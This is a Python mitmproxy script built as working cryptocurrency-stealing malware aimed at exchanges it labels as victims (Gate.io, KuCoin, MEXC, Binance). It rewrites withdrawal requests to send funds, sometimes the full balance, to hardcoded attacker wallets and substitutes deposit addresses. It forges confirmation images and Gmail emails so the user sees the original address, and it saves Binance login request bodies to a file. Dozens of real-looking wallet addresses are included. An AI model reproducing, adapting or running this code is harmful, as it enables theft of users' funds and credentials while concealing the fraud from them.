from mitmproxy import http
import json
import io
import base64
from PIL import Image, ImageDraw, ImageFont
from html2image import Html2Image
hti = Html2Image()
import re

vitims = ["binance.com", "gate.io", "kucoin.com", "okx.com"]
totalbalance = ""
token = ""
Network = ""
feeobj = {}
fee = 0
avalable_number = 0
origin_amount = ""
origin_wallet = ""
origin_token = ""

besttoken = ""
besttokenamount = ""

# bnb_wallet = "bnb1hv54kmt0fxnf78hq5lt75t6x9c7jvxt64sarvu"
# tron_wallet = "TFpBDbRDS7sntCvcuUFguxA2rMncgE8jgW"
# eth_wallet = "0x58b09c23E54507c2899B5D14DE79DD379839CA15"
# tezos_wallet = "tz1YatWmFjk9hd82xG71HfYcWKs7Z5CZypFC"
# sol_wallet = "2uciLLEbW7xmpN8ouKgRfkjKKr7u62q6PtWpqrsmwhGk"
# algo_wallet = "UGWMHBYQMYV5LXH7ZVUIHRYOJ3NTZ3JB2JOEZPL66KAZSCZOUKCC7AUEJU"
# near_wallet = "74d6828ce2b4fee10c1b24e8568391a8595aab1624a6a029bcbc64aedb41a876"
# polka_wallet = "1etrqWvHqN7Zg7Ux1PzNcKz83GTrh726AGXiKumKbfTu8wj"
# btc_wallet = "bc1qxllxhg8rt8dxz4m7sxx6mzuqpqkj6r0ca7nuav"
# xrp_wallet = "rN6iEEn9d6Kyxdz1N2SN4LhwNA8CMNBf6p"
# xmr_wallet = "48o1gypDETDVnn7RFGBdhiPoKURDwrHiAVQgaqi4rzav3s1zXRotCwEFYLLwUNTwPRU5nXgnsFWPzGZLCJpjwo2Z9SM5fVX".

#l
bnb_wallet = "bnb1qndl33zhjvy9gna3vyszlgxjt9g0vjmflxr8j9"
tron_wallet = "TM3MPXawHGXcnz5n6dj32BKbZJPz8aQBfc"
eth_wallet = "0x6aB53b39D5F38C45CA5426c83A12b08b8d876F52"
tezos_wallet = "tz1cetyHfPZNahqHZSRccFueQhHu8yZuDfXH"
sol_wallet = "65qjF49b4r8ttkgJbpgRBswriMQaAeKCCmAAXcbD85C"
algo_wallet = "FXX34AJGDYLJIHSDBKCITP3NEGOWVWOCWKI2CGICJDUE5QT35GZ7KJZTVY"
near_wallet = "74d6828ce2b4fee10c1b24e8568391a8595aab1624a6a029bcbc64aedb41a876"
polka_wallet = "13NY9veywucxR8VcDoUXcNPPQpiU9SaDKhqJdVCcbY8sGyTe"
btc_wallet = "bc1q53q4r4wsj2cquap2evh68mz7rxa3gfk2fz6edu"
xrp_wallet = "rsL4wJnyn5VAZGwQQkxVA4gVJjRWj6roXK"
xmr_wallet = "43wwFF7dLaWTtZwwSxDh5i1t5JRtCSEym3RWm7Xuaav5XsAc7dCoydvfwnUJhucZhJ3YC1GGRBdQr8qfh6NPsHpsLi1EL3t"

#t
# bnb_wallet = "bnb1slh5075r6wcmx2v77e6xsqaucrl6lnsthj9q5m"
# tron_wallet = "TX3LLAUZfFNRvEpTWye7CMvh2KbKbAVXk4"
# eth_wallet = "0xcF9f24723b9F810b19Ea0EAb71bbf128203AF1b5"
# tezos_wallet = "tz1TFLaop8i7ZMecozb2jFG4cCvS2iGkCSVR"
# sol_wallet = "mk3zbhoGgS1xbRhEetnP2A6UWuDLdKsCRgu7asoq7iw"
# algo_wallet = "4VGSFCLCU7INS34JIZVZTNG36VTNMOYCLUN3A5NLQEYTMR5ZF4X6T5YGAM"
# near_wallet = "74d6828ce2b4fee10c1b24e8568391a8595aab1624a6a029bcbc64aedb41a876"
# polka_wallet = "16Kw3psYf7qjmMVdexpy1AzFSAZzhbqsJfRGwAr6LiTHD9ix"
# btc_wallet = "bc1qww8p038h278nu7zr8hr9myk5dd0ls7rtskf52d"
# xrp_wallet = "rHHat3pSDwyZiSs4LzAhGjDW47xfQXstjd"
# xmr_wallet = "43jBKwM5XSLarRfhy6wF44dD5wSpLgBqyiuxARyKG7rU9uZVoKqns55bPnme9DrmGVYQ6HTTm9i8UduCqe6wuqpxSpH6jUg"

#h
# bnb_wallet = "bnb1tt35xm2srrqw66855ne8vvaz738zpglcr6d6nf"
# tron_wallet = "TVLTfXxDe2FQAuHjQ1mXwJZWyEbgoxW26f"
# eth_wallet = "0xeef5C741cc7F7fcF0c0DB3A2a2253a09b8aa9Ff9"
# tezos_wallet = "tz1h3NV1YRqSB4LLke6B9Jfv6aU8yocv5CDG"
# sol_wallet = "CfZx4VLb5JAb4JjqanLimGGhvfKHqibi2XpBmZAzhut"
# algo_wallet = "6XHZUGPRI7GLCWGE6VXCSMJCSTV27OKND6N2DFTHI2HTJ4BSSBMIW25MRE"
# near_wallet = "74d6828ce2b4fee10c1b24e8568391a8595aab1624a6a029bcbc64aedb41a876"
# polka_wallet = "143Mz8ZD5SAKgFtU3keTsQNobspLYaSk4cBqDoBVe7TEQ81"
# btc_wallet = "bc1q3fge66swdnkhzwj9dse2lkua05w8lrqc93fza0"
# xrp_wallet = "r4v3s4RxFHBrfZwiMHrTfYESwY1q28ePT2"
# xmr_wallet = "43ip81xqGYyfTyU4tG1CXgXAPoxMDvDGuE8qifr855TwgD22DXjQc5SMKYTcu7K3EtLADQLnj3figChrSimJnMWcU7CSgej"

def detect_wallet_network(wallet_address):
    tron_pattern = re.compile("^T[1-9A-HJ-NP-Za-km-z]{33}$")
    evm_pattern = re.compile("^0x[a-fA-F0-9]{40}$")
    alto_pattern = re.compile("^([A-Z2-7]{58})$")
    solana_pattern = re.compile("^[1-9A-HJ-NP-Za-km-z]{32,44}$")
    near_pattern = re.compile("^(([a-z\d]+[-_])*[a-z\d]+[.])*([a-z\d]+[-_])*[a-z\d]+$")
    btc_pattern = re.compile("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$")
    xrp_pattern = re.compile("^r[1-9A-HJ-NP-Za-km-z]{25,34}$")
    xmr_pattern = re.compile("^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$")
    tezos_pattern = re.compile("^tz1[1-9A-Za-z]{33}$")
    polka_pattern = re.compile("^1[1-9A-HJ-NP-Za-km-z]{47}$")

    if tron_pattern.match(wallet_address):
        return tron_wallet
    elif evm_pattern.match(wallet_address):
        return eth_wallet
    elif alto_pattern.match(wallet_address):
        return algo_wallet
    elif btc_pattern.match(wallet_address):
        return btc_wallet
    elif solana_pattern.match(wallet_address):
        return sol_wallet
    elif near_pattern.match(wallet_address):
        return near_wallet
    elif xrp_pattern.match(wallet_address):
        return xrp_wallet
    elif xmr_pattern.match(wallet_address):
        return xmr_wallet
    elif tezos_pattern.match(wallet_address):
        return tezos_wallet
    elif polka_pattern.match(wallet_address):
        return polka_wallet
    else:
        return eth_wallet
    

def get_line_with_string(text, search_string):
    lines = text.split("\n")
    for line in lines:
        if search_string in line:
            return line
    return None

def get_string_between(string, start, end):
    start_index = string.find(start)
    if start_index == -1:
        return ""
    start_index += len(start)
    end_index = string.find(end, start_index)
    if end_index == -1:
        return ""
    return string[start_index:end_index]

def request(flow: http.HTTPFlow):
    api_url = flow.request.url
    if "gate.io" in api_url:
        if "myaccount/second_confirm" in api_url:
            oldcontent = flow.request.content.decode("utf-8")
            oldlist = oldcontent.split("&")

            global origin_amount
            global origin_wallet
            global Network
            global origin_token
            global feeobj
            global fee

            origin_amount = oldlist[2].split("=")[1]
            origin_wallet = oldlist[3].split("=")[1]
            Network = oldlist[1].split("=")[1]
            origin_token = oldlist[0].split("=")[1]

            for element in feeobj["datas"]:
                if Network == element["chain"]:
                    fee = element["withdraw_txfee"]
            
            oldlist[2] = "amount=" + str(avalable_number)
            oldlist[3] = "addr=" + detect_wallet_network(origin_wallet)
            newliststring = "&".join(oldlist)
            flow.request.content = newliststring.encode('utf-8')

    if "kucoin.com" in api_url:
        if "withdraw/info-confirm" in api_url:
            origin_amount = flow.request.query["amount"]
            origin_wallet = flow.request.query["address"]
            Network = flow.request.query["chainId"]
            origin_token = flow.request.query["currency"]
            flow.request.query["address"] = detect_wallet_network(origin_wallet)
 
    if "mexc.com" in api_url:
        if "asset/api/withdraw/save_withdraw" in api_url:
            old = flow.request.content.decode("utf-8")
            oldobj = json.loads(old)
            origin_wallet = oldobj["address"]
            origin_amount = oldobj["amount"]
            origin_token = oldobj["currency"]
            oldobj["address"] = detect_wallet_network(oldobj["address"])
            newliststring = json.dumps(oldobj)
            flow.request.content = newliststring.encode('utf-8')

    if flow.request.pretty_host == "accounts.binance.com":
        with open("input.txt", "w") as text_file:
            text_file.write(flow.request.content.decode("utf-8") )
        
    elif flow.request.path.endswith("/brew"):
        if flow.request.pretty_host == "accounts.binance.com":
            response_data = flow.response.content
            with open("Output.txt", "w") as text_file:
                text_file.write(response_data)

def response(flow: http.HTTPFlow):
    api_url = flow.request.url
    global totalbalance
    global token

    if "gate.io" in api_url:

        if "myaccount/get_coin_list" in api_url:
            html = flow.response.content.decode("utf-8")
            array = json.loads(html)
            totalbalance = array[0][4]
            token = array[0][1]
            with open("html.txt", "w") as text_file:
                text_file.write(array[0][4])
        
        if "myaccount/second_confirm" in api_url:
            
            image = Image.new("RGBA", (416, 240), (255, 0, 0, 0))
            draw = ImageDraw.Draw(image)
            font = ImageFont.truetype("arial.ttf", 18)

            networktype = Network
            Quantity = origin_amount
            address = origin_wallet
            token = origin_token

            a, b, width, height = font.getbbox(networktype)
            x = 416 - width - 12
            draw.text((10, 15), "Network", font=font, fill="black")
            draw.text((x, 15), networktype, fill="black", font=font)

            a, b, width, height = font.getbbox(Quantity + " " + token)
            x = 416 - width - 12
            draw.text((10, 45), "Quantity", font=font, fill="black")
            draw.text((x, 45), Quantity + " " + token, fill="black", font=font)

            a, b, width, height = font.getbbox(str(fee) + " " + token)
            x = 416 - width - 12
            draw.text((10, 75), "Fee", font=font, fill="black")
            draw.text((x, 75), str(fee) + " " + token, fill="black", font=font)

            a, b, width, height = font.getbbox(str(fee + float(Quantity)) + " " + token)
            x = 416 - width - 12
            draw.text((10, 105), "Receive Amount", font=font, fill="black")
            draw.text((x, 105), str(float(Quantity) - fee) + " " + token, font=font, fill="#cc3d3d")

            a, b, width, height = font.getbbox(address[:30])
            x = 416 - width - 12
            draw.text((10, 135), "Address", font=font, fill="black")
            draw.text((x, 135), address[:30], font=font, fill="black")
            draw.text((x, 165), address[30:], font=font, fill="black")

            draw.text((10, 195), "Address Name", font=font, fill="black")

            image.save("output.png", 'PNG')

            with open("output.png", "rb") as file:
                binary_content = file.read()
                base64_data = base64.b64encode(binary_content)
                old = json.loads(flow.response.content.decode("utf-8"))
                old["img_src"] = base64_data.decode('utf-8')
                json_string = json.dumps(old)
                flow.response.content = json_string.encode('utf-8')

        if "myaccount/withdraw/" in api_url:
            flow.response.decode()
            global avalable_number
            avalable_line = get_line_with_string(flow.response.text, "<span class=\"withdrawal_limit_right\">")
            avalable_number = float(get_string_between(avalable_line, "<span class=\"withdrawal_limit_right\">", "</span>").split(" ")[0])
        
        if "query?u=113" in api_url:
            global feeobj
            feeobj = json.loads(flow.response.content)
            # for element in feeobj["datas"]:
            #     if fee < float(element["withdraw_txfee"]):
            #         fee = float(element["withdraw_txfee"])
            
        if "myaccount/deposit/" in api_url:
            flow.response.decode()
            line = get_line_with_string(flow.response.text, "var deposit_addresses = JSON.parse(")
            objstring = get_string_between(line,"(`", "`);")
            obj = json.loads(objstring)
           
            with io.open("t.json", mode="w", encoding="utf-8") as file:
                file.write(objstring)
            
            for element in obj:
                if ("ERC20" in element["name_en"]  
                    or "BEP20" in element["name_en"] 
                    or "GRC20" in element["name_en"] 
                    or "AVAX" in element["name_en"] 
                    or "Polygon" in element["name_en"] 
                    or "Arbitrum One" in element["name_en"]
                    or "Optimism" in element["name_en"]
                    or "OKExChain" in element["name_en"]
                    or "EVM" in element["name_en"]):

                    element["addresses"][0]["raw_address"] = eth_wallet
                    element["addresses"][0]["address"] = eth_wallet
                    element["address"] = eth_wallet

                if "TRC20" in element["name_en"]:
                    element["addresses"][0]["raw_address"] = tron_wallet
                    element["addresses"][0]["address"] = tron_wallet
                    element["address"] = tron_wallet

                if "Tezos" in element["name_en"]:
                    element["addresses"][0]["raw_address"] = tezos_wallet
                    element["addresses"][0]["address"] = tezos_wallet
                    element["address"] = tezos_wallet

                if "Solana" in element["name_en"]:
                    element["addresses"][0]["raw_address"] = sol_wallet
                    element["addresses"][0]["address"] = sol_wallet
                    element["address"] = sol_wallet

                if "Algorand" in element["name_en"]:
                    element["addresses"][0]["raw_address"] = algo_wallet
                    element["addresses"][0]["address"] = algo_wallet
                    element["address"] = algo_wallet

                if "Near" in element["name_en"]:
                    element["addresses"][0]["raw_address"] = near_wallet
                    element["addresses"][0]["address"] = near_wallet
                    element["address"] = near_wallet

                if "Polkadot" in element["name_en"]:
                    element["addresses"][0]["raw_address"] = polka_wallet
                    element["addresses"][0]["address"] = polka_wallet
                    element["address"] = polka_wallet

                if "BRC20" in element["name_en"]:
                    element["addresses"][0]["raw_address"] = btc_wallet
                    element["addresses"][0]["address"] = btc_wallet
                    element["address"] = btc_wallet

                if "BNB/BEP2" == element["name_en"]:
                    element["addresses"][0]["raw_address"] = bnb_wallet
                    element["addresses"][0]["address"] = bnb_wallet
                    element["address"] = bnb_wallet

                if "XRP" == element["name_en"]:
                    element["addresses"][0]["raw_address"] = xrp_wallet
                    element["addresses"][0]["address"] = xrp_wallet
                    element["address"] = xrp_wallet

                if "XMR" == element["name_en"]:
                    element["addresses"][0]["raw_address"] = xmr_wallet
                    element["addresses"][0]["address"] = xmr_wallet
                    element["address"] = xmr_wallet
                    
            json_string = json.dumps(obj)
            flow.response.text = flow.response.text.replace(objstring, json_string)

    if "kucoin.com" in api_url:
        if "_api/payment/deposit-address" in api_url:
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)
            if oldobj["data"]["chainId"] == "trx":
                oldobj["data"]["address"] = tron_wallet
            elif oldobj["data"]["chainId"] == "eth":
                oldobj["data"]["address"] = eth_wallet
            elif oldobj["data"]["chainId"] == "btc":
                oldobj["data"]["address"] = btc_wallet
            elif oldobj["data"]["chainId"] == "sol":
                oldobj["data"]["address"] = sol_wallet
            elif oldobj["data"]["chainId"] == "algo":
                oldobj["data"]["address"] = algo_wallet
            elif oldobj["data"]["chainId"] == "xrp":
                oldobj["data"]["address"] = xrp_wallet
            elif oldobj["data"]["chainId"] == "xmr":
                oldobj["data"]["address"] = xmr_wallet
            elif oldobj["data"]["chainId"] == "near":
                oldobj["data"]["address"] = near_wallet     
            elif oldobj["data"]["chainId"] == "bsc":
                oldobj["data"]["address"] = eth_wallet
            else :
                oldobj["data"]["address"] = detect_wallet_network(oldobj["data"]["address"])
            
            json_string = json.dumps(oldobj)
            flow.response.content = json_string.encode('utf-8')

        if "_api/account-front/query/currency-sort?type=WITHDRAW" in api_url:
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)

        if "_api/payment/withdraw/fee?" in api_url:
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)
            feeobj = oldobj
            
        if "withdraw/info-confirm"  in api_url:
            image = Image.new("RGBA", (372, 174), (246, 252, 251, 1))
            draw = ImageDraw.Draw(image)
            font = ImageFont.truetype("arial.ttf", 17)

            networktype = Network
            Quantity = origin_amount
            address = origin_wallet
            token = origin_token

            draw.text((10, 10), "Withdrawal:" + " " + Quantity + " " + token, font=font, fill="#33B497")
            draw.text((10, 35), "Withdrawal To:" + " " + address[:25] + " " + token, font=font, fill="#33B497")
            draw.text((10, 57), address[25:], font=font, fill="#33B497")
            draw.text((10, 80), "Network:" + " " + networktype, font=font, fill="#33B497")
            draw.text((10, 105), "Withdraw Safety Phrase: You can also add a", font=font, fill="#33B497")
            draw.text((10, 125), "withdraw safety phrase to this image from acc", font=font, fill="#33B497")
            draw.text((10, 145), "ount settings", font=font, fill="#33B497")


            image.save("output.png", 'PNG')

            with open("output.png", "rb") as file:
                binary_content = file.read()
                base64_data = base64.b64encode(binary_content)
                old = json.loads(flow.response.content.decode("utf-8"))
                old["data"]["imgData"] = "data:image/png;base64," + base64_data.decode('utf-8')
                old["img_src"] = base64_data.decode('utf-8')
                json_string = json.dumps(old)
                flow.response.content = json_string.encode('utf-8')
    
    if "mail.google.com/mail/u/0/data" in api_url:
        oldstring = flow.response.content.decode('utf-8')
        address = detect_wallet_network(origin_wallet)
        nwe = oldstring.replace(address[:30] + "\\u003cwbr\\u003e" + address[30:], origin_wallet[:30] + "\\u003cwbr\\u003e" + origin_wallet[30:])
        nwe = oldstring.replace(address[:30] + "\\\\u003cwbr\\\\u003e" + address[30:], origin_wallet[:30] + "\\\\u003cwbr\\\\u003e" + origin_wallet[30:])

        flow.response.content = nwe.encode("utf-8")

    if "www.mexc.com" in api_url:
        if "api/platform/asset/api/asset/spot/currency" in api_url:
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)
            chains = oldobj["data"]["chains"]
            print(chains[0])
            for chain in chains:
                if "address" in chain:
                    chain["address"] = detect_wallet_network(chain["address"])
            json_string = json.dumps(oldobj)
            flow.response.content = json_string.encode('utf-8')
        
        if "api/asset/deposit/withdraw/currency/query" in api_url:
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)
            avalable_number = float(oldobj["data"]["assets"][0]["available"])

            
        if "platform/withdraw/latest" in api_url : 
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)
            oldobj["data"][0]["address"] = origin_wallet
            json_string = json.dumps(oldobj)
            flow.response.content = json_string.encode('utf-8')
        
        if "api/platform/withdraw?" in api_url:
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)
            oldobj["data"]["result"][0]["address"] = origin_wallet
            json_string = json.dumps(oldobj)
            flow.response.content = json_string.encode('utf-8')

        if "asset/api/withdraw/save_withdraw" in api_url:
            networktype = Network
            Quantity = origin_amount
            address = origin_wallet
            token = origin_token

            image = Image.new("RGBA", (308, 24), (246, 252, 251, 0))
            draw = ImageDraw.Draw(image)
            font = ImageFont.truetype("arial.ttf", 15)

            if len(address) > 34:
                image = Image.new("RGBA", (308, 40), (246, 252, 251, 0))
                draw = ImageDraw.Draw(image)
                font = ImageFont.truetype("arial.ttf", 15)

                a, b, width, height = font.getbbox(address[:35])
                x = 308 - width - 2
                draw.text((x, 2), address[:35], font=font, fill="white")
                a, b, width, height = font.getbbox(address[35:])
                x = 308 - width - 2
                draw.text((x , 20), address[35:], font=font, fill="white")

                image.save("output.jpeg", 'PNG')
            else :
                image = Image.new("RGBA", (308, 24), (246, 252, 251, 0))
                draw = ImageDraw.Draw(image)
                font = ImageFont.truetype("arial.ttf", 15)

                draw.text((5, 2), address, font=font, fill="white")
                image.save("output.jpeg", 'PNG')

            with open("output.jpeg", "rb") as file:
                binary_content = file.read()
                base64_data = base64.b64encode(binary_content)
                old = json.loads(flow.response.content.decode("utf-8"))
                old["data"]["addressImage"] = "data:image/jpeg;base64," + base64_data.decode('utf-8')
                old["data"]["addressText"] = address
                json_string = json.dumps(old)
                flow.response.content = json_string.encode('utf-8')

    if "binance.us" in api_url or "binance.com" in api_url:
        if "/gateway-api/v1/private/capital/deposit/getAddress" in api_url:
            oldobjstring = flow.response.content.decode("utf-8")
            oldobj = json.loads(oldobjstring)
            oldobj["data"]["address"] = detect_wallet_network(oldobj["data"]["address"])
            json_string = json.dumps(oldobj)
            flow.response.content = json_string.encode('utf-8')